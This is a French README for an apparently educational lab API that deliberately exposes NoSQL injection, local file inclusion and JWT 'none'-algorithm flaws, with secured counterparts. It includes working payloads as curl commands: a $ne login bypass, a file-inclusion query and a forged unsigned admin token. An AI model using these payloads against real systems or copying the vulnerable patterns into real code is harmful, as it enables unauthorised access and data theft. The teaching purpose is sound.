# 🔓 TP Sécurité Web - API Express

> API de démonstration des vulnérabilités web à des fins pédagogiques

## 🎯 Description

API Express hébergée sur Azure démontrant 3 vulnérabilités web courantes et leurs remédiations :
- **NoSQL Injection** - Bypass d'authentification MongoDB
- **Local File Inclusion (LFI)** - Lecture de fichiers non autorisés  
- **JWT Vulnérable** - Tokens avec secrets faibles + algorithme "none"

## 🌐 API en Ligne (Azure)

- **🔗 API Live :** https://tp-securite-khelifa.francecentral.cloudapp.azure.com
- **📚 Documentation Swagger :** https://tp-securite-khelifa.francecentral.cloudapp.azure.com/api
- **🔒 HTTPS** avec certificat Let's Encrypt

## 🚀 Test Rapide

### Via Swagger UI (Recommandé)
1. Accédez à la [documentation interactive](https://tp-securite-khelifa.francecentral.cloudapp.azure.com/api)
2. Créez un utilisateur : `POST /create-user`
3. Testez les vulnérabilités dans la section `🚨 Endpoints vulnérables`
4. Vérifiez les protections dans `🛡️ Versions sécurisées`

### Via curl
```bash
# NoSQL Injection
curl -X POST https://tp-securite-khelifa.francecentral.cloudapp.azure.com/vulnerable/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# LFI
curl "https://tp-securite-khelifa.francecentral.cloudapp.azure.com/vulnerable/file?file=secret.txt"

# JWT avec algorithme "none"
curl -X POST https://tp-securite-khelifa.francecentral.cloudapp.azure.com/vulnerable/jwt-verify \
  -H "Content-Type: application/json" \
  -d '{"token":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."}'
```

## 🛠️ Installation Locale (Optionnel)

```bash
# Prérequis : Node.js 16+, MongoDB
git clone <votre-repo>
cd tp-securite-api
npm install
mongod          # Terminal séparé
npm start       # http://localhost:8080
```

## 📁 Structure

```
tp-securite-api/
├── server.js              # API Express principale
├── package.json           # Dépendances npm
├── demo-files/            # Fichiers pour tests LFI
│   ├── public.txt         # Fichier autorisé
│   ├── secret.txt         # Fichier sensible
│   └── config.txt         # Configuration avec credentials
└── README.md              # Ce fichier
```

## 📊 Endpoints Principaux

| Type | Endpoint | Description |
|------|----------|-------------|
| **🚨 Vulnérable** | `/vulnerable/login` | NoSQL Injection |
| **🚨 Vulnérable** | `/vulnerable/file` | Local File Inclusion |
| **🚨 Vulnérable** | `/vulnerable/jwt-*` | JWT avec failles |
| **🛡️ Sécurisé** | `/secure/login` | Authentification protégée |
| **🛡️ Sécurisé** | `/secure/file` | Accès fichiers contrôlé |
| **🛡️ Sécurisé** | `/secure/jwt-*` | JWT sécurisé |

## 🧪 Tests de Vulnérabilités

### NoSQL Injection
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```

### LFI
```
?file=public.txt
?file=secret.txt
```

### JWT Algorithm None
```json
{"token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."}
```

## 🏗️ Infrastructure Azure

- **VM :** Standard B1s (Ubuntu 22.04 LTS)
- **Reverse Proxy :** Nginx avec SSL
- **Process Manager :** PM2
- **Base de données :** MongoDB 6.0
- **Certificat :** Let's Encrypt (auto-renouvelé)

## ⚠️ Avertissement

**🚨 UTILISATION PÉDAGOGIQUE UNIQUEMENT**

- ✅ Tests sur cette API de démonstration
- ✅ Apprentissage en cybersécurité
- ❌ Tests non autorisés sur d'autres systèmes
- ❌ Utilisation malveillante

## 📚 Documentation

- **Documentation complète :** [docs.page](votre-lien-docs-page)
- **Swagger API :** [/api](https://tp-securite-khelifa.francecentral.cloudapp.azure.com/api)

## 🔧 Technologies

- **Backend :** Node.js + Express.js
- **Base de données :** MongoDB + Mongoose
- **Documentation :** Swagger UI
- **Sécurité :** bcrypt, jsonwebtoken
- **Déploiement :** PM2, Nginx, Let's Encrypt

---

**Développé pour l'apprentissage de la cybersécurité web** 🎓